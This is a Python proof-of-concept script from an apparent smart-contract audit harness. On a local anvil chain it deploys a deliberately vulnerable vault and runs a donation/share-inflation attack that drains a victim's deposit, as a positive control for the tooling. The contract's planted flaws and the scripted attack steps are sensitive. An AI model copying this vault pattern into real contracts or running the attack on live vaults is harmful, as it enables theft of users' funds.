#!/usr/bin/env python3
"""PoC-4 (positive control): the planted-vuln vault, executed for real.

Deploys the investigator fixture (InflatableVault: deposit prices
shares off address(this).balance, donate() inflates the balance with
no shares, withdrawAll() pays the full balance with no gate) on a
fresh local anvil chain, then runs the donation attack:

    attacker deposits 1 ETH  -> mints shares
    attacker donates 10 ETH  -> balance inflated, no shares issued
    victim deposits 1 ETH    -> shares round to ~0
    attacker withdrawAll()   -> drains the vault

FORK-ONLY / LOCAL-ONLY: everything runs on a throwaway local anvil
instance; no live chain is touched. The point is to prove the PoC
machinery can produce a positive fork delta (not just reverts): the
three live-candidate PoCs all reverted, so this control shows the
harness itself works and the reverts are properties of those
contracts, not of the tooling.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from fork_poc import STRANGER, _free_port, _run  # noqa: E402

ANVIL = os.path.expanduser("~/.foundry/bin/anvil")
CAST = os.path.expanduser("~/.foundry/bin/cast")
FORGE = os.path.expanduser("~/.foundry/bin/forge")
VICTIM = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
# Sends use --unlocked (anvil signs); no private key is handled.

FIXTURE_SOL = """\
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
contract InflatableVault {
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    address public owner;
    constructor() { owner = msg.sender; }
    function deposit() external payable {
        uint256 s;
        if (totalShares == 0) { s = msg.value; }
        else { s = msg.value * totalShares / address(this).balance; }
        shares[msg.sender] += s;
        totalShares += s;
    }
    function donate() external payable {}
    function withdrawAll() external {
        uint256 amount = address(this).balance;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
    }
}
"""


def main() -> int:
    out_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "poc-runs")
    os.makedirs(out_dir, exist_ok=True)
    proj = "/tmp/poc4-vault"
    os.makedirs(f"{proj}/src", exist_ok=True)
    with open(f"{proj}/src/InflatableVault.sol", "w") as fh:
        fh.write(FIXTURE_SOL)
    with open(f"{proj}/foundry.toml", "w") as fh:
        fh.write('[profile.default]\nsrc = "src"\nout = "out"\n')
    rc, out, err = _run([FORGE, "build", "--root", proj], timeout=180)
    if rc != 0:
        print(json.dumps({"poc_id": "poc-4-positive-control",
                          "error": f"forge build failed: {err[:400]}"}))
        return 1
    artifact = json.load(open(
        f"{proj}/out/InflatableVault.sol/InflatableVault.json"))
    bytecode = artifact["bytecode"]["object"]
    port = _free_port()
    rpc = f"http://127.0.0.1:{port}"
    anvil = subprocess.Popen(
        [ANVIL, "--port", str(port)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    report: dict = {
        "poc_id": "poc-4-positive-control",
        "hypothesis": ("donation attack on the planted vault: attacker "
                       "deposits 1 ETH, donates 10 ETH, victim deposits "
                       "1 ETH for ~0 shares, attacker withdrawAll() "
                       "drains ~12 ETH"),
        "chain": "local-anvil", "fork": "fresh local chain, no fork-url",
        "verdict": "UNVERIFIED",
        "verdict_reason": ("local execution is not a live chain: "
                           "UNVERIFIED by design; this is a positive "
                           "control for the PoC machinery"),
    }
    try:
        deadline = time.time() + 60
        while time.time() < deadline:
            rc, _, _ = _run([CAST, "block-number", "--rpc-url", rpc],
                            timeout=10)
            if rc == 0:
                break
            time.sleep(1)
        rc, out, err = _run([CAST, "send", "--unlocked",
                             "--from", STRANGER,
                             "--rpc-url", rpc, "--create", bytecode],
                            timeout=60)
        if rc != 0:
            report["error"] = f"deploy failed: {err[:300]}"
            print(json.dumps(report, indent=1))
            return 1
        vault = None
        for line in out.splitlines():
            if "contractAddress" in line or "Deployed to" in line:
                vault = line.split()[-1]
        report["vault"] = vault

        def bal(addr):
            rc, out, _ = _run([CAST, "balance", addr, "--rpc-url", rpc])
            return int(out.split()[0], 0) if rc == 0 else None

        def call(fn, *args, sender=STRANGER, key=None,
                 value=None):
            cmd = [CAST, "send", "--unlocked", "--from", sender,
                   vault, fn, *args, "--rpc-url", rpc]
            if value is not None:
                cmd += ["--value", value]
            return _run(cmd, timeout=60)

        def shares(addr):
            rc, out, _ = _run([CAST, "call", vault,
                               "shares(address)(uint256)", addr,
                               "--rpc-url", rpc])
            # cast call prints "1000000000000000000 [1e18]": first token.
            return int(out.split()[0], 0) if rc == 0 else None

        steps = []
        atk0, vic0 = bal(STRANGER), bal(VICTIM)
        rc, out, err = call("deposit()", sender=STRANGER,
                            value="1000000000000000000")
        steps.append({"step": "attacker deposit 1 ETH", "ok": rc == 0,
                      "error": err[:200] if rc else None,
                      "attacker_shares": shares(STRANGER)})
        rc, out, err = call("donate()", sender=STRANGER,
                            value="10000000000000000000")
        steps.append({"step": "attacker donate 10 ETH", "ok": rc == 0,
                      "error": err[:200] if rc else None,
                      "vault_balance_wei": bal(vault)})
        rc, out, err = call("deposit()", sender=VICTIM,
                            value="1000000000000000000")
        steps.append({"step": "victim deposit 1 ETH", "ok": rc == 0,
                      "error": err[:200] if rc else None,
                      "victim_shares": shares(VICTIM)})
        rc, out, err = call("withdrawAll()", sender=STRANGER)
        steps.append({"step": "attacker withdrawAll", "ok": rc == 0,
                      "error": err[:200] if rc else None})
        report["steps"] = steps
        report["deltas"] = {
            "attacker_eth_wei": bal(STRANGER) - atk0,
            "victim_eth_wei": bal(VICTIM) - vic0,
            "vault_balance_wei": bal(vault),
            "victim_shares": shares(VICTIM),
            "attacker_shares": shares(STRANGER),
        }
        d = report["deltas"]
        report["fork_executed"] = all(s["ok"] for s in steps)
        report["fork_outcome"] = (
            f"victim deposited 1 ETH for {d['victim_shares']} shares; "
            f"attacker net {d['attacker_eth_wei'] / 1e18:+.4f} ETH, "
            f"victim net {d['victim_eth_wei'] / 1e18:+.4f} ETH, vault "
            f"left with {d['vault_balance_wei']} wei")
    finally:
        anvil.terminate()
        try:
            anvil.wait(timeout=10)
        except subprocess.TimeoutExpired:
            anvil.kill()
    path = os.path.join(out_dir, "poc-4-positive-control.json")
    with open(path, "w") as fh:
        json.dump(report, fh, indent=1)
    print(json.dumps(report, indent=1))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
